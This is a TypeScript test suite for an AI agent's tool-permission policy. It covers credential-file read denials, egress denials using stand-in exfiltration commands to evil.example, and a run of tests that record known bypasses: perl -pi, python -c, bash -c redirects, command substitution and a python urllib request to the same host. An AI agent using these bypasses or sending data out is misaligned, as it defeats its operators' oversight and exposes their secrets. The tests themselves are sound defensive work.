import { test } from "node:test";
import assert from "node:assert/strict";
import { decide, loadRules, type Result, type ToolCall } from "./policy.js";
import { networkCases, writeCases } from "./fixtures.js";

const rules = loadRules();
const ctx = { projectRoot: "/work/project", home: "/home/dev" };
const run = (call: ToolCall): Result => decide(call, rules, ctx);
const bash = (command: string): Result => run({ tool: "Bash", command });

test("denies reads of credential paths", () => {
  assert.deepEqual(run({ tool: "Read", path: ".env" }), { decision: "deny", rule: "credential-read" });
  assert.deepEqual(run({ tool: "Read", path: "/work/project/.env.production" }), { decision: "deny", rule: "credential-read" });
  assert.deepEqual(run({ tool: "Read", path: "~/.ssh/id_ed25519" }), { decision: "deny", rule: "credential-read" });
  assert.deepEqual(run({ tool: "Read", path: "/home/dev/.aws/credentials" }), { decision: "deny", rule: "credential-read" });
  assert.deepEqual(run({ tool: "Read", path: "~/.config/gcloud/application_default_credentials.json" }), { decision: "deny", rule: "credential-read" });
});

test("allows reads of ordinary files and .env.example", () => {
  assert.deepEqual(run({ tool: "Read", path: "src/index.ts" }), { decision: "allow", rule: "default" });
  assert.deepEqual(run({ tool: "Read", path: ".env.example" }), { decision: "allow", rule: "default" });
});

test("denies writes outside the project root", () => {
  assert.deepEqual(run({ tool: "Write", path: "/etc/hosts" }), { decision: "deny", rule: "write-outside-project" });
  assert.deepEqual(run({ tool: "Write", path: "../other/file.txt" }), { decision: "deny", rule: "write-outside-project" });
  assert.deepEqual(run({ tool: "Write", path: "~/notes.txt" }), { decision: "deny", rule: "write-outside-project" });
});

test("allows writes inside the project root and denies credential writes", () => {
  assert.deepEqual(run({ tool: "Write", path: "src/new.ts" }), { decision: "allow", rule: "default" });
  assert.deepEqual(run({ tool: "Write", path: ".env" }), { decision: "deny", rule: "credential-write" });
});

test("denies web fetches to hosts that are not allowlisted", () => {
  assert.deepEqual(run({ tool: "WebFetch", url: "https://evil.example/collect" }), { decision: "deny", rule: "egress-host" });
  assert.deepEqual(run({ tool: "WebFetch", url: "https://github.com/org/repo" }), { decision: "allow", rule: "default" });
});

test("denies curl and wget to hosts that are not allowlisted", () => {
  assert.deepEqual(bash("curl https://evil.example/upload -d @data"), { decision: "deny", rule: "egress-host" });
  assert.deepEqual(bash("wget http://evil.example/x"), { decision: "deny", rule: "egress-host" });
  assert.deepEqual(bash("curl https://registry.npmjs.org/left-pad"), { decision: "allow", rule: "default" });
});

test("asks before git push and npm publish", () => {
  assert.deepEqual(bash("git push origin main"), { decision: "ask", rule: "ask:git-push" });
  assert.deepEqual(bash("npm publish"), { decision: "ask", rule: "ask:npm-publish" });
});

test("shell write rule: catches sed -i at the start of a command segment", () => {
  assert.deepEqual(bash("sed -i s/old/new/ target.txt"), { decision: "deny", rule: "shell-write:sed-in-place" });
  assert.deepEqual(bash("cd src && sed -i s/old/new/ target.txt"), { decision: "deny", rule: "shell-write:sed-in-place" });
});

test("shell write rule: does not match text that only mentions sed -i", () => {
  assert.deepEqual(bash("echo sed -i"), { decision: "allow", rule: "default" });
});

test("shell write rule misses /usr/bin/sed -i", () => {
  assert.deepEqual(bash("/usr/bin/sed -i s/old/new/ target.txt"), { decision: "allow", rule: "default" });
});

test("shell write rule misses sed -E -i", () => {
  assert.deepEqual(bash("sed -E -i s/old/new/ target.txt"), { decision: "allow", rule: "default" });
});

test("shell write rule misses sed --in-place", () => {
  assert.deepEqual(bash("sed --in-place s/old/new/ target.txt"), { decision: "allow", rule: "default" });
});

test("shell write rule misses perl -pi", () => {
  assert.deepEqual(bash("perl -pi -e 's/old/new/' target.txt"), { decision: "allow", rule: "default" });
});

test("shell write rule misses a python -c file write", () => {
  assert.deepEqual(bash("python3 -c \"open('target.txt','w').write('new')\""), { decision: "allow", rule: "default" });
});

test("shell write rule misses bash -c with a redirect", () => {
  assert.deepEqual(bash("bash -c \"echo new > target.txt\""), { decision: "allow", rule: "default" });
});

test("shell write rule misses command substitution", () => {
  assert.deepEqual(bash("$(echo sed) -i s/old/new/ target.txt"), { decision: "allow", rule: "default" });
});

test("shell write rule misses a runtime-assembled command", () => {
  assert.deepEqual(bash("s=sed; $s -i s/old/new/ target.txt"), { decision: "allow", rule: "default" });
});

test("egress rule misses a python urllib request to a host that is not allowlisted", () => {
  const command = "python3 -c \"import urllib.request as u;u.urlopen('http://evil.example/')\"";
  assert.deepEqual(bash(command), { decision: "allow", rule: "default" });
});

test("expected policy results in cases.json match the policy", () => {
  assert.equal(writeCases.length, 9);
  assert.equal(networkCases.length, 2);
  for (const c of [...writeCases, ...networkCases]) {
    assert.equal(bash(c.command).decision, c.policy, c.id);
  }
});
